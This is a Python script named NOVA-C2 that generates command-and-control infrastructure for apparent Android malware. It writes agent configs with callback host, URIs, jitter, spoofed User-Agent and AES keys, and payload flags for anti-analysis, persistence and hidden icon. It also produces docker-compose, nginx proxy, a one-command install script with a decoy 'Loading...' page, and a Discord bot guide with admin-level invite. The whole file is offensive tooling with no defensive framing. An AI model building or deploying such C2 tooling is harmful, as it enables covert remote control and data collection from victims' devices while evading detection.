#!/usr/bin/env python3
"""NOVA-C2 C2 Infrastructure Config Generator"""
import os, json, time, textwrap, random, string
from pathlib import Path

def _init_colors():
    try:
        import ctypes
        h = ctypes.windll.kernel32.GetStdHandle(-11)
        m = ctypes.c_uint32()
        if ctypes.windll.kernel32.GetConsoleMode(h, ctypes.byref(m)):
            ctypes.windll.kernel32.SetConsoleMode(h, m.value | 4)
    except:
        pass
    return type('C', (), {
        'RED': '\033[91m', 'GREEN': '\033[92m', 'YELLOW': '\033[93m',
        'CYAN': '\033[96m', 'WHITE': '\033[97m', 'GREY': '\033[90m',
        'BOLD': '\033[1m', 'RESET': '\033[0m'
    })()

C = _init_colors()

ROOT = Path(__file__).parent.absolute()
CONFIGS_DIR = ROOT / 'c2_configs'
CONFIGS_DIR.mkdir(exist_ok=True)

def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def gen_c2_config():
    print(f'{C.BOLD}{C.CYAN}+==========================================+{C.RESET}')
    print(f'{C.BOLD}{C.CYAN}|      C2 INFRASTRUCTURE CONFIG            |{C.RESET}')
    print(f'{C.BOLD}{C.CYAN}+==========================================+{C.RESET}')

    print(f'\n{C.BOLD}{C.WHITE}C2 Server Configuration:{C.RESET}')

    host = input(f'{C.CYAN}  Callback host/domain [{C.GREY}https://your-server.com{C.CYAN}]: {C.RESET}').strip()
    if not host:
        host = 'https://your-server.com'
    host = host.rstrip('/')

    default_port = '443'
    port = input(f'{C.CYAN}  Callback port [{C.GREY}{default_port}{C.CYAN}]: {C.RESET}').strip() or default_port

    get_uri = input(f'{C.CYAN}  GET/Poll URI [{C.GREY}/api/v1/mobile/poll{C.CYAN}]: {C.RESET}').strip() or '/api/v1/mobile/poll'
    if not get_uri.startswith('/'):
        get_uri = '/' + get_uri

    post_uri = input(f'{C.CYAN}  POST/Submit URI [{C.GREY}/api/v1/mobile/submit{C.CYAN}]: {C.RESET}').strip() or '/api/v1/mobile/submit'
    if not post_uri.startswith('/'):
        post_uri = '/' + post_uri

    heartbeat_min = input(f'{C.CYAN}  Heartbeat interval (s) [{C.GREY}45{C.CYAN}]: {C.RESET}').strip()
    try:
        heartbeat_min = max(15, min(300, int(heartbeat_min)))
    except:
        heartbeat_min = 45

    user_agent = input(f'{C.CYAN}  User-Agent [{C.GREY}Mozilla/5.0 (Linux; Android 14; SM-S24){C.CYAN}]: {C.RESET}').strip()
    if not user_agent:
        user_agent = 'Mozilla/5.0 (Linux; Android 14; SM-S24) Build/UP1A.240105.002; wv) AppleWebKit/537.36'

    jitter = input(f'{C.CYAN}  Jitter (0-100%) [{C.GREY}25{C.CYAN}]: {C.RESET}').strip()
    try:
        jitter = max(0, min(100, int(jitter)))
    except:
        jitter = 25

    print(f'\n{C.BOLD}{C.WHITE}Deploy Kit Options:{C.RESET}')
    include_docker = input(f'{C.CYAN}  Generate docker-compose.yml? [{C.GREY}Y/n{C.CYAN}]: {C.RESET}').strip().lower() != 'n'
    include_nginx = input(f'{C.CYAN}  Generate nginx config? [{C.GREY}Y/n{C.CYAN}]: {C.RESET}').strip().lower() != 'n'
    include_script = input(f'{C.CYAN}  Generate install script? [{C.GREY}Y/n{C.CYAN}]: {C.RESET}').strip().lower() != 'n'
    include_panel = input(f'{C.CYAN}  Generate bot invite/guide? [{C.GREY}Y/n{C.CYAN}]: {C.RESET}').strip().lower() != 'n'

    ts = time.strftime('%Y%m%d_%H%M%S')
    config_id = f'c2_{ts}'
    config_dir = CONFIGS_DIR / config_id
    config_dir.mkdir(parents=True, exist_ok=True)

    c2_config = {
        "config_id": config_id,
        "generated": time.strftime('%Y-%m-%d %H:%M:%S'),
        "c2": {
            "callback_host": host,
            "callback_port": int(port),
            "get_uri": get_uri,
            "post_uri": post_uri,
            "heartbeat_seconds": heartbeat_min,
            "jitter_percent": jitter,
            "user_agent": user_agent
        },
        "device": {
            "encryption": "aes-256-gcm",
            "offline_sync": True,
            "max_retries": 5,
            "transport": "https"
        },
        "payload": {
            "features": [],
            "anti_analysis": True,
            "persistence": True,
            "hide_icon": True
        }
    }

    config_path = config_dir / 'c2_config.json'
    with open(config_path, 'w') as f:
        json.dump(c2_config, f, indent=2)
    print(f'{C.GREEN}[+] Config saved: {config_path}{C.RESET}')

    agent_config = {
        "C2_HOST": host,
        "C2_PORT": int(port),
        "C2_GET_URI": get_uri,
        "C2_POST_URI": post_uri,
        "HEARTBEAT_MS": heartbeat_min * 1000,
        "JITTER": jitter,
        "USER_AGENT": user_agent,
        "AES_KEY": rand_str(32),
        "AES_IV": rand_str(16),
        "ENCRYPTION": "aes-256-gcm",
        "TIMEOUT_MS": 15000,
        "RETRIES": 5
    }

    agent_cfg_path = config_dir / 'agent_config.json'
    with open(agent_cfg_path, 'w') as f:
        json.dump(agent_config, f, indent=2)
    print(f'{C.GREEN}[+] Agent config saved: {agent_cfg_path}{C.RESET}')

    nginx_pass = rand_str(16)
    if include_docker:
        docker_compose = f'''version: '3.8'

services:
  c2-server:
    image: nginx:alpine
    container_name: nova-c2-server
    ports:
      - "{port}:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
      - ./ssl:/etc/nginx/ssl:ro
      - ./www:/var/www/html
    restart: unless-stopped
    networks:
      - nova-net

  c2-api:
    image: node:20-alpine
    container_name: nova-c2-api
    working_dir: /app
    volumes:
      - ./api:/app
    command: node server.js
    restart: unless-stopped
    networks:
      - nova-net
    environment:
      - PORT=3000
      - AUTH_TOKEN={rand_str(32)}

  c2-bot:
    image: node:20-alpine
    container_name: nova-c2-bot
    working_dir: /bot
    volumes:
      - ./bot:/bot
    command: node index.js
    restart: unless-stopped
    depends_on:
      - c2-api
    environment:
      - API_URL=http://c2-api:3000
      - BOT_TOKEN=YOUR_DISCORD_BOT_TOKEN
      - AUTH_TOKEN={rand_str(32)}

networks:
  nova-net:
    driver: bridge
'''
        (config_dir / 'docker-compose.yml').write_text(docker_compose)
        print(f'{C.GREEN}[+] Generated: docker-compose.yml{C.RESET}')

    if include_nginx:
        nginx_conf = f'''events {{
    worker_connections 1024;
}}

http {{
    server {{
        listen {port} ssl http2;
        server_name {host.replace('https://', '')};

        ssl_certificate /etc/nginx/ssl/cert.pem;
        ssl_certificate_key /etc/nginx/ssl/key.pem;

        location {get_uri} {{
            proxy_pass http://c2-api:3000;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_buffering off;
            proxy_cache off;
        }}

        location {post_uri} {{
            proxy_pass http://c2-api:3000;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_buffering off;
            proxy_cache off;
        }}

        location / {{
            root /var/www/html;
            index index.html;
        }}
    }}
}}
'''
        (config_dir / 'nginx.conf').write_text(nginx_conf)
        print(f'{C.GREEN}[+] Generated: nginx.conf{C.RESET}')

    if include_script:
        install_script = f'''#!/bin/bash
# NOVA-C2 Install Script
# Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}

set -e

echo "[+] Creating directory structure..."
mkdir -p ssl www api bot

echo "[+] Generating self-signed SSL certificate..."
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \\
    -keyout ssl/key.pem -out ssl/cert.pem \\
    -subj "/C=US/ST=State/L=City/O=NOVA-C2/CN={host.replace('https://', '')}"

echo "[+] Generating authentication tokens..."
cat > api/.env << 'EOF'
PORT=3000
AUTH_TOKEN={rand_str(32)}
EOF

cat > bot/.env << 'EOF'
DISCORD_TOKEN=YOUR_DISCORD_BOT_TOKEN
API_URL=http://localhost:3000
AUTH_TOKEN={rand_str(32)}
EOF

echo "[+] Creating placeholder index page..."
cat > www/index.html << 'EOF'
<!DOCTYPE html><html><head><title>Loading...</title>
<style>body{{background:#1a1b2e;color:#fff;font-family:sans-serif;
display:flex;align-items:center;justify-content:center;height:100vh;}}
h1{{opacity:0.7;}}</style></head><body><h1>Loading...</h1></body></html>
EOF

echo "[+] Starting with docker-compose..."
docker-compose up -d

echo "[+] C2 infrastructure deployed!"
echo "[+] Callback URL: {host}:{port}{get_uri}"
echo "[+] Submit URL:   {host}:{port}{post_uri}"
echo ""
echo "[!] IMPORTANT: Set your Discord bot token in bot/.env"
'''
        (config_dir / 'install.sh').write_text(install_script)
        print(f'{C.GREEN}[+] Generated: install.sh{C.RESET}')

    if include_panel:
        guide = f'''# NOVA-C2 Deployment Guide
# Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}

## C2 Server
Callback URL: {host}:{port}{get_uri}
Submit URL:   {host}:{port}{post_uri}
Heartbeat:    {heartbeat_min}s (jitter: {jitter}%)
User-Agent:   {user_agent}

## Discord Bot Setup
1. Create a Discord Application at https://discord.com/developers/applications
2. Create a Bot, copy the token
3. Set bot token in bot/.env
4. Use OAuth2 URL Generator with 'bot' and 'applications.commands' scopes
5. Invite bot to your server

## Invite URL
https://discord.com/api/oauth2/authorize?client_id=YOUR_CLIENT_ID&permissions=8&scope=bot+applications.commands

## Required Bot Permissions
- Send Messages
- Manage Messages
- Read Message History
- Attach Files
- Embed Links
- Add Reactions
- Use Slash Commands
- Create Public Threads

## Files in this kit
- docker-compose.yml: Container orchestration
- nginx.conf: Reverse proxy config
- install.sh: One-command deploy
- ssl/: TLS certificates (auto-generated)
- api/: C2 API backend
- bot/: Discord bot (clone from repo)
- www/: Static landing page
'''
        (config_dir / 'DEPLOY.md').write_text(guide)
        print(f'{C.GREEN}[+] Generated: DEPLOY.md{C.RESET}')

    print(f'\n{C.BOLD}{C.GREEN}+==========================================+{C.RESET}')
    print(f'{C.BOLD}{C.GREEN}|        C2 CONFIG GENERATED                |{C.RESET}')
    print(f'{C.BOLD}{C.GREEN}+==========================================+{C.RESET}')
    print(f'  Output: {config_dir}')
    print(f'  Config: {config_path}')
    print(f'\n{C.YELLOW}[!] Set DISCORD_TOKEN in bot/.env before deploying{C.RESET}')

    return str(config_dir)

def list_configs():
    configs = sorted(CONFIGS_DIR.iterdir()) if CONFIGS_DIR.exists() else []
    if not configs:
        print(f'{C.YELLOW}[!] No saved configs found.{C.RESET}')
        return
    print(f'\n{C.BOLD}{C.WHITE}Saved C2 Configs:{C.RESET}\n')
    for c in configs:
        if c.is_dir():
            cfg_file = c / 'c2_config.json'
            if cfg_file.exists():
                try:
                    data = json.loads(cfg_file.read_text())
                    host = data.get('c2', {}).get('callback_host', '?')
                    ts = data.get('generated', '?')
                    print(f'  {C.CYAN}{c.name}{C.RESET}')
                    print(f'      Host: {C.GREY}{host}{C.RESET}')
                    print(f'      Date: {C.GREY}{ts}{C.RESET}')
                except:
                    print(f'  {C.CYAN}{c.name}{C.RESET} {C.RED}(invalid){C.RESET}')

if __name__ == '__main__':
    gen_c2_config()
